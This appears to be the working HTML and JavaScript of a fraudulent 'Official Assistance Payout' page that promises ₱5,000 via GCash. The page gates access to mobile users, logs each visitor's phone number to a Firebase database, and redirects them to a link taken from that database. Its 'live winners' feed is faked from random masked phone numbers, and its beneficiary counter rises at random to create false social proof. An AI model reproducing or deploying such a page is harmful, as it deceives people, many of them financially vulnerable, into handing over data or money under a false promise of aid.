<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>FreeShoppingPH | Official Assistance Payout</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --nature-green: #2d6a4f;
            --soft-mint: #d8f3dc;
            --emerald: #40916c;
            --white-glass: rgba(255, 255, 255, 0.9);
            --text-dark: #1b4332;
            --gcash-blue: #007dfe;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body { 
            font-family: 'Public Sans', sans-serif; 
            background: linear-gradient(135deg, #e9f5f0 0%, #d8f3dc 100%); 
            color: var(--text-dark); 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            overflow-x: hidden;
        }

        .card {
            background: var(--white-glass);
            width: 100%;
            max-width: 400px;
            padding: 30px 20px;
            border-radius: 35px;
            box-shadow: 0 20px 45px rgba(45, 106, 79, 0.1);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.6);
            backdrop-filter: blur(10px);
        }

        .logo-img {
            width: 100%;
            max-width: 200px;
            margin: 0 auto 15px auto;
            display: block;
            border-radius: 15px;
        }

        h1 {
            font-size: 12px;
            color: var(--emerald);
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: 800;
            margin-bottom: 5px;
        }

        .amount {
            font-family: 'Quicksand', sans-serif;
            font-size: 44px;
            font-weight: 700;
            color: var(--nature-green); 
            margin-bottom: 20px;
            text-shadow: 0 2px 10px rgba(45, 106, 79, 0.1);
        }

        .pay-button { 
            background: linear-gradient(135deg, #52b788 0%, #2d6a4f 100%); 
            color: white; 
            width: 100%;
            padding: 18px; 
            border: none; 
            border-radius: 18px; 
            font-size: 16px; 
            font-weight: 700;
            cursor: pointer; 
            transition: all 0.3s ease;
            box-shadow: 0 8px 20px rgba(45, 106, 79, 0.2);
        }

        .pay-button:disabled { background: #94a3b8; box-shadow: none; transform: none; }

        #timer-text { display: none; color: #d90429; font-weight: 700; margin-top: 15px; font-size: 14px; }

        .promo-photo {
            width: 100%;
            border-radius: 18px;
            margin-top: 20px;
            border: 3px solid white;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }

        .winners-container {
            background: rgba(255, 255, 255, 0.7);
            border: 1px solid var(--soft-mint);
            padding: 15px;
            border-radius: 20px;
            margin-top: 20px;
            text-align: left;
        }

        .winners-container h3 {
            font-size: 11px;
            color: var(--emerald);
            margin-bottom: 10px;
            text-transform: uppercase;
            text-align: center;
        }

        .winner-item {
            background: white;
            padding: 8px 12px;
            border-radius: 10px;
            font-size: 13px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 6px;
            border: 1px solid #f0f7f4;
            animation: slideIn 0.5s ease forwards;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .gcash-mini {
            width: 22px;
            height: 22px;
            border-radius: 5px;
            object-fit: cover;
            display: block;
        }

        .payout-green { color: var(--emerald); font-weight: 800; }

        .live-footer {
            margin-top: 15px;
            font-size: 10px;
            font-weight: 700;
            color: var(--emerald);
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }
        .dot { height: 6px; width: 6px; background-color: #ff0000; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div class="card">
    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" alt="Logo" class="logo-img">
    
    <h1>Available Funds</h1>
    <div class="amount" id="balanceText">₱5,000.00</div>

    <button class="pay-button" id="claimBtn" onclick="redirectToGCash()">
        CLAIM THRU GCASH
    </button>

    <div id="timer-text">SECURE RE-CLAIM IN: <span id="waitTimer">05:00</span></div>

    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo" alt="Promo">

    <div class="winners-container">
        <h3>🔴 Live Success Stories</h3>
        <div id="winners-list"></div>
        <div class="live-footer">
            <span class="dot"></span> 
            <span id="beneficiary-count">20</span> Beneficiaries Today
        </div>
    </div>
</div>

<script src="config.js?v=4"></script>

<script>
    // 1. MOBILE ONLY & SECURITY CHECK
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    if (!isMobile) {
        window.location.href = "index.html"; 
    }
    if (sessionStorage.getItem('verified_user') !== 'true') {
        window.location.href = "index.html"; 
    }

    // 2. FIREBASE SETUP
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function animateValue(id, start, end, duration) {
        const obj = document.getElementById(id);
        if(!obj) return;
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            const currentVal = Math.floor(progress * (end - start) + start);
            obj.innerHTML = "₱" + currentVal.toLocaleString() + ".00";
            if (progress < 1) {
                window.requestAnimationFrame(step);
            }
        };
        window.requestAnimationFrame(step);
    }

    // 3. BOOKING LOGIC
    function redirectToGCash() {
        const btn = document.getElementById('claimBtn');
        const bal = document.getElementById('balanceText');
        const timerDiv = document.getElementById('timer-text');

        if(btn.disabled) return;

        btn.disabled = true;
        btn.innerHTML = "CHECKING SLOTS...";

        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value')
        .then((snapshot) => {
            if (snapshot.exists()) {
                let linkKey = '';
                let linkData = null;
                snapshot.forEach(child => {
                    linkKey = child.key;
                    linkData = child.val();
                });

                let userId = sessionStorage.getItem('user_phone') || 'User_' + Math.floor(Math.random()*9999);

                db.ref('links/' + linkKey).update({
                    status: 'pending',
                    user: userId
                }).then(() => {
                    animateValue("balanceText", 5000, 0, 800); 
                    bal.style.opacity = "0.5";
                    btn.innerHTML = "Processing...";
                    timerDiv.style.display = "block";
                    startTimer(300);

                    setTimeout(() => {
                        window.location.href = linkData.url;
                    }, 1200);
                });

            } else {
                alert("This link is currently in use. Please try again in a few minutes.");
                btn.disabled = false;
                btn.innerHTML = "CLAIM THRU GCASH";
            }
        }).catch(err => {
            console.error(err);
            btn.disabled = false;
            btn.innerHTML = "CLAIM THRU GCASH";
        });
    }

    function startTimer(sec) {
        let timer = sec;
        const display = document.getElementById('waitTimer');
        const interval = setInterval(() => {
            let m = Math.floor(timer / 60);
            let s = timer % 60;
            if(display) display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
            
            if (--timer < 0) {
                clearInterval(interval);
                animateValue("balanceText", 0, 5000, 1500); 
                const bal = document.getElementById('balanceText');
                const btn = document.getElementById('claimBtn');
                if(bal) bal.style.opacity = "1";
                if(btn) {
                    btn.disabled = false;
                    btn.innerHTML = "CLAIM THRU GCASH";
                }
                const tDiv = document.getElementById('timer-text');
                if(tDiv) tDiv.style.display = "none";
            }
        }, 1000);
    }

    // 4. LIVE WINNERS & BENEFICIARY COUNTER
    let currentBeneficiaries = 20;

    function generateWinner() {
        const list = document.getElementById('winners-list');
        const countDisplay = document.getElementById('beneficiary-count');
        if (!list) return;

        // Increase count 20 per day start (adds 1 randomly)
        currentBeneficiaries += Math.floor(Math.random() * 2);
        if(countDisplay) countDisplay.innerText = currentBeneficiaries.toLocaleString();

        const prefixes = ['0912', '0915', '0916', '0917', '0922', '0927', '0935', '0945', '0955', '0966'];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const randomSuffix = Math.floor(1000 + Math.random() * 8999); // 4 random digits
        
        // Static URL for icon para iwas load error
        const myGcashImage = "https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png"; 

        const winnerEntry = document.createElement('div');
        winnerEntry.className = 'winner-item';
        // FORMAT: 0912***8912
        winnerEntry.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <img src="${myGcashImage}" class="gcash-mini" alt="GCash">
                <span>${randomPrefix}***${randomSuffix}</span>
            </div>
            <strong class="payout-green">+₱5,000</strong>
        `;

        list.prepend(winnerEntry);
        if (list.children.length > 5) list.removeChild(list.lastChild);
    }

    // 5. STARTUP
    document.addEventListener("DOMContentLoaded", function() {
        generateWinner();
        generateWinner();
        setInterval(generateWinner, 4000); // Bilis ng palit ng winners (4 seconds)
    });
</script>

</body>
</html>
